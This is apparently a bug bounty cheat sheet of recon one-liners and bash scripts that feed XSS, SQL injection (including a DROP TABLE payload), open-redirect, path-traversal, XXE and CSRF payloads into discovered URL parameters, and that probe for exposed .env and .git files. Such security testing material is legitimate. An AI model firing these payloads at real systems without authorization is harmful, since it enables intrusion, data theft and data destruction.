# bugbounty-cheetsheet
# 🎯 Bug Bounty One-Liners & Quick Scripts

## 🚀 Complete Bug Bounty Workflow One-Liners

### 🔍 Complete Recon Chain (One-Liner)
```bash
# Complete subdomain → live hosts → tech detection → parameters → URLs
echo "example.com" | subfinder -silent | httpx -silent -sc -cl -ct -location -title -tech-detect -o live_hosts.txt && cat live_hosts.txt | waybackurls | unfurl --unique paths | head -1000 > paths.txt && cat live_hosts.txt | gau | grep "=" | qsreplace "FUZZ" | head -1000 > params.txt && echo "Recon complete! Check live_hosts.txt, paths.txt, params.txt"
```

### 🎯 Ultra-Fast Subdomain to Exploitation Pipeline
```bash
# One command to rule them all!
domain="example.com"; subfinder -d $domain -silent | httpx -silent -sc -cl -title -tech-detect -follow-redirects | tee live.txt && cat live.txt | waybackurls | gau | uro | head -2000 | nuclei -silent -o vulns.txt && echo "💥 Check vulns.txt for findings!"
```

---

## 🔗 Individual One-Liners by Phase

### 📡 Subdomain Discovery One-Liners

```bash
# Fast subdomain discovery with multiple tools
echo "example.com" | subfinder -silent | anew subs.txt && echo "example.com" | assetfinder | anew subs.txt && cat subs.txt | httpx -silent -sc -title -cl -ct

# Subdomain + certificate transparency
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httpx -silent -sc

# Subdomain discovery with immediate live check
subfinder -d example.com -silent | httpx -silent -sc -cl -title -tech-detect -location -o live_subdomains.txt

# Mass subdomain discovery from file
cat domains.txt | subfinder -silent | httpx -silent -sc -title -cl -tech-detect -threads 100
```

### 🌐 Live Host Detection with Full Info

```bash
# Live hosts with status code, title, content-length, tech stack
cat subdomains.txt | httpx -silent -sc -title -cl -ct -server -tech-detect -location -follow-redirects

# Live hosts + screenshot in one go
cat subdomains.txt | httpx -silent -sc -title | gowitness file --stdin

# Live hosts with specific status codes only
cat subdomains.txt | httpx -silent -mc 200,301,302,403 -sc -title -cl

# Live hosts + probe for common ports
cat subdomains.txt | httpx -silent -ports 80,443,8080,8443,9000 -sc -title -cl -tech-detect
```

### 🔍 URL Discovery & Parameter Mining

```bash
# URLs from Wayback Machine + parameter extraction
cat live_hosts.txt | waybackurls | grep "=" | qsreplace "FUZZ" | head -1000

# GAU (Get All URLs) + parameter extraction
cat live_hosts.txt | gau | grep "=" | uro | head -1000

# Parameter discovery from multiple sources
cat live_hosts.txt | waybackurls | gau | grep "=" | unfurl --unique keys | sort -u

# Clean URLs and extract paths
cat live_hosts.txt | waybackurls | uro | unfurl --unique paths | head -500

# Find URLs with interesting extensions
cat live_hosts.txt | waybackurls | grep -E "\.(php|asp|aspx|jsp|do|action)" | head -200
```

### ⚡ Quick Vulnerability Scanning

```bash
# Nuclei scan on live hosts
cat live_hosts.txt | nuclei -silent -t cves,vulnerabilities -o nuclei_results.txt

# XSS testing on parameters
cat params.txt | sed 's/FUZZ/<script>alert(1)<\/script>/' | while read url; do curl -sk "$url" | grep -i "script>alert" && echo "Potential XSS: $url"; done

# SQL injection quick test
cat params.txt | sed 's/FUZZ/'"'"'/' | while read url; do response=$(curl -sk "$url"); if echo "$response" | grep -i "sql\|mysql\|error"; then echo "Potential SQLi: $url"; fi; done

# Open redirect testing
cat params.txt | sed 's/FUZZ/https:\/\/evil.com/' | while read url; do curl -sk -I "$url" | grep -i "location.*evil.com" && echo "Open Redirect: $url"; done
```

---

## 📜 Quick Scripts for Bug Bounty

### 🚀 Ultimate Recon Script (5-Minute Setup)
```bash
#!/bin/bash
# recon.sh - Complete recon in one script

domain=$1
if [ -z "$domain" ]; then
    echo "Usage: $0 example.com"
    exit 1
fi

echo "🎯 Starting recon for $domain"
mkdir -p "$domain"
cd "$domain"

# Phase 1: Subdomains
echo "🔍 Finding subdomains..."
subfinder -d "$domain" -silent | anew subdomains.txt
assetfinder "$domain" | anew subdomains.txt
curl -s "https://crt.sh/?q=%25.$domain&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew subdomains.txt

# Phase 2: Live hosts with full info
echo "🌐 Checking live hosts..."
cat subdomains.txt | httpx -silent -sc -title -cl -ct -tech-detect -location -follow-redirects -o live_hosts.txt

# Phase 3: URL gathering  
echo "📡 Gathering URLs..."
cat live_hosts.txt | waybackurls | anew urls.txt
cat live_hosts.txt | gau | anew urls.txt

# Phase 4: Parameter extraction
echo "🎯 Extracting parameters..."
cat urls.txt | grep "=" | qsreplace "FUZZ" | anew params.txt
cat urls.txt | unfurl --unique keys | anew param_names.txt

# Phase 5: Directory paths
echo "📂 Extracting paths..."
cat urls.txt | unfurl --unique paths | head -1000 | anew paths.txt

# Phase 6: Quick vulnerability scan
echo "💥 Quick vulnerability scan..."
cat live_hosts.txt | nuclei -silent -t cves,vulnerabilities,exposures -o nuclei_results.txt

# Summary
echo "✅ Recon complete for $domain!"
echo "📊 Results:"
echo "   - $(wc -l < subdomains.txt) subdomains found"  
echo "   - $(wc -l < live_hosts.txt) live hosts"
echo "   - $(wc -l < urls.txt) URLs collected"
echo "   - $(wc -l < params.txt) parameters found"
echo "   - $(wc -l < nuclei_results.txt) potential vulnerabilities"
```

### ⚡ Lightning-Fast XSS Hunter
```bash
#!/bin/bash
# xss_hunter.sh - Quick XSS detection

target_file=$1
if [ ! -f "$target_file" ]; then
    echo "Usage: $0 urls_with_params.txt"
    exit 1
fi

echo "🔥 Starting XSS hunt..."

# XSS payloads
payloads=(
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
    "<svg onload=alert(1)>"
    "javascript:alert(1)"
    "'\"><script>alert(1)</script>"
)

while IFS= read -r url; do
    for payload in "${payloads[@]}"; do
        test_url=$(echo "$url" | sed "s/FUZZ/$(echo "$payload" | sed 's/[[\.*^$()+?{|]/\\&/g')/g")
        
        response=$(curl -sk "$test_url" --max-time 10)
        
        if echo "$response" | grep -q "$(echo "$payload" | sed 's/<[^>]*>//g')"; then
            echo "🚨 XSS FOUND: $test_url"
            echo "   Payload: $payload"
            echo "   Response contains: $(echo "$response" | grep -o "$(echo "$payload" | sed 's/<[^>]*>//g')")"
            echo "---"
        fi
    done
done < "$target_file"
```

### 💉 SQL Injection Quick Tester
```bash
#!/bin/bash
# sqli_tester.sh - Quick SQLi detection

target_file=$1
if [ ! -f "$target_file" ]; then
    echo "Usage: $0 urls_with_params.txt"
    exit 1
fi

echo "💉 Starting SQL injection tests..."

# SQL payloads
payloads=(
    "'"
    "1'"
    "1' OR '1'='1"
    "1' OR '1'='1' --"
    "1' OR '1'='1' #"
    "' OR 1=1--"
    "' UNION SELECT 1--"
    "1'; DROP TABLE users--"
)

while IFS= read -r url; do
    for payload in "${payloads[@]}"; do
        test_url=$(echo "$url" | sed "s/FUZZ/$(echo "$payload" | sed 's/[[\.*^$()+?{|]/\\&/g')/g")
        
        response=$(curl -sk "$test_url" --max-time 10)
        
        # Check for SQL error indicators
        if echo "$response" | grep -iE "(sql|mysql|oracle|postgresql|sqlite|syntax error|mysql_fetch|ORA-[0-9]|microsoft jet database|odbc|ole db)"; then
            echo "🚨 POTENTIAL SQLi: $test_url"
            echo "   Payload: $payload"
            echo "   Error found in response"
            echo "---"
        fi
    done
done < "$target_file"
```

### 🔄 Open Redirect Hunter
```bash
#!/bin/bash
# redirect_hunter.sh - Find open redirects

target_file=$1
if [ ! -f "$target_file" ]; then
    echo "Usage: $0 urls_with_params.txt"
    exit 1
fi

echo "🔄 Hunting for open redirects..."

# Redirect payloads
payloads=(
    "https://evil.com"
    "//evil.com"
    "https://google.com"  
    "//google.com"
    "javascript:alert(1)"
    "data:text/html,<script>alert(1)</script>"
)

while IFS= read -r url; do
    for payload in "${payloads[@]}"; do
        test_url=$(echo "$url" | sed "s/FUZZ/$(echo "$payload" | sed 's/[[\.*^$()+?{|]/\\&/g')/g")
        
        response=$(curl -skI "$test_url" --max-time 10)
        
        # Check Location header for redirect
        location=$(echo "$response" | grep -i "^location:" | cut -d' ' -f2- | tr -d '\r')
        
        if [[ "$location" == *"evil.com"* ]] || [[ "$location" == *"google.com"* ]] || [[ "$location" == *"javascript:"* ]]; then
            echo "🚨 OPEN REDIRECT FOUND: $test_url"
            echo "   Payload: $payload"
            echo "   Redirects to: $location"
            echo "---"
        fi
    done
done < "$target_file"
```

---

## 🎛️ Useful One-Liner Utilities

### 📊 Quick Statistics
```bash
# Count findings by type
echo "Live Hosts: $(cat live_hosts.txt 2>/dev/null | wc -l)"; echo "Parameters: $(cat params.txt 2>/dev/null | wc -l)"; echo "URLs: $(cat urls.txt 2>/dev/null | wc -l)"

# Status code distribution
cat live_hosts.txt | grep -o "\[.*\]" | sort | uniq -c | sort -nr

# Technology stack summary  
cat live_hosts.txt | grep -o "\[.*\]" | grep -E "(php|asp|python|java|node)" | sort | uniq -c
```

### 🔧 Data Processing One-Liners
```bash
# Extract only 200 status URLs
cat live_hosts.txt | grep "\[200\]" | cut -d' ' -f1

# Get unique parameter names
cat params.txt | unfurl --unique keys | sort -u

# Extract only interesting file extensions
cat urls.txt | grep -E "\.(php|asp|aspx|jsp|do|action|cgi)$"

# Find potential admin/login pages
cat urls.txt | grep -iE "(admin|login|signin|auth|panel|dashboard)"

# Extract domains from URLs
cat urls.txt | unfurl --unique domains | sort -u
```

### 🚀 Mass Testing One-Liners
```bash
# Test XSS on all parameters at once
cat params.txt | sed 's/FUZZ/<script>alert(1)<\/script>/' | parallel -j 50 'curl -sk {} | grep -l "script>alert" && echo {}'

# Test SQLi on all parameters
cat params.txt | sed "s/FUZZ/'/" | parallel -j 20 'curl -sk {} | grep -l "sql\|mysql\|error" && echo {}'

# Test for directory traversal
cat params.txt | sed 's/FUZZ/..\/..\/..\/etc\/passwd/' | parallel -j 30 'curl -sk {} | grep -l "root:" && echo {}'

# Mass nuclei scan
cat live_hosts.txt | cut -d' ' -f1 | nuclei -silent -t cves,vulnerabilities -c 100
```

---

## 📱 Quick Mobile Commands

### 📲 Mobile-Specific Testing
```bash
# Find mobile app endpoints
cat urls.txt | grep -E "(api|mobile|app)" | head -100

# Test for mobile-specific parameters
echo "app_version=1.0&device_id=123&platform=android" | sed 's/&/\n/g' | sed 's/=/=FUZZ/'

# Mobile User-Agent testing
curl -H "User-Agent: okhttp/3.12.0" -sk "https://example.com/api/endpoint"
```

---

## ⚡ Rapid Exploitation Commands

### 💥 Quick Wins Testing
```bash
# Test for common misconfigurations in one line
curl -sk "https://example.com/.env" -o env.txt && curl -sk "https://example.com/config.php" -o config.txt && curl -sk "https://example.com/.git/config" -o git.txt

# Rapid IDOR testing
curl -sk "https://example.com/api/user/123" && curl -sk "https://example.com/api/user/124" && curl -sk "https://example.com/api/user/1"

# Quick CSRF test
echo '<form action="https://example.com/change-password" method="POST"><input name="password" value="hacked123"><input type="submit"></form>' > csrf_test.html

# Fast XXE test
echo '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>' | curl -X POST -d @- "https://example.com/xml-endpoint"
```

### 🎯 Target-Specific Quick Tests
```bash
# WordPress specific
curl -sk "https://example.com/wp-config.php.bak" && curl -sk "https://example.com/wp-admin/" && curl -sk "https://example.com/xmlrpc.php"

# Laravel specific  
curl -sk "https://example.com/.env" && curl -sk "https://example.com/telescope" && curl -sk "https://example.com/_ignition"

# Django specific
curl -sk "https://example.com/admin/" && curl -sk "https://example.com/settings.py" && curl -sk "https://example.com/__debug__"
```

---

## 🎨 Pretty Output & Reporting

### 📊 Formatted Output
```bash
# Colorful output for findings
echo -e "\033[32m[+] Live Hosts Found: $(wc -l < live_hosts.txt)\033[0m"
echo -e "\033[33m[*] Parameters Extracted: $(wc -l < params.txt)\033[0m"  
echo -e "\033[31m[!] Vulnerabilities: $(wc -l < nuclei_results.txt)\033[0m"

# Generate HTML report
echo "<h1>Bug Bounty Results</h1><h2>Live Hosts</h2><pre>$(cat live_hosts.txt)</pre><h2>Vulnerabilities</h2><pre>$(cat nuclei_results.txt)</pre>" > report.html
```

### 📋 Quick Checklist Generator
```bash
# Generate testing checklist
cat << EOF > checklist.txt
🎯 Bug Bounty Checklist for $(basename $(pwd))

✅ Reconnaissance Phase:
□ Subdomains discovered: $(wc -l < subdomains.txt 2>/dev/null || echo "0")
□ Live hosts found: $(wc -l < live_hosts.txt 2>/dev/null || echo "0")  
□ URLs collected: $(wc -l < urls.txt 2>/dev/null || echo "0")
□ Parameters found: $(wc -l < params.txt 2>/dev/null || echo "0")

🔍 Vulnerability Testing:
□ XSS testing completed
□ SQL injection tested  
□ IDOR testing done
□ CSRF tokens checked
□ File upload tested
□ Authentication bypassed

📊 Results:
□ Nuclei vulnerabilities: $(wc -l < nuclei_results.txt 2>/dev/null || echo "0")
□ Manual testing completed
□ Reports submitted
EOF
```

---

## 💡 Pro Tips & Usage Examples

### 🚀 How to Use These One-Liners

1. **Start with the complete chain:**
```bash
echo "target.com" | subfinder -silent | httpx -silent -sc -title -tech-detect | tee live.txt
```

2. **Then extract parameters:**
```bash
cat live.txt | waybackurls | grep "=" | qsreplace "FUZZ" > params.txt
```

3. **Test for vulnerabilities:**
```bash
cat params.txt | head -100 | nuclei -silent -t xss,sqli
```

4. **Manual testing:**
```bash
# Use the quick scripts above on your params.txt
./xss_hunter.sh params.txt
./sqli_tester.sh params.txt
```

### ⚡ Speed Optimization Tips
```bash
# Use parallel processing
cat urls.txt | parallel -j 50 'curl -sk {} > {#}.response'

# Limit results for faster testing
cat params.txt | head -100 | nuclei -silent -c 100

# Use threading options
subfinder -d target.com -t 100 | httpx -threads 200
```

Remember: Always test these on authorized targets only! Happy hunting! 🎯
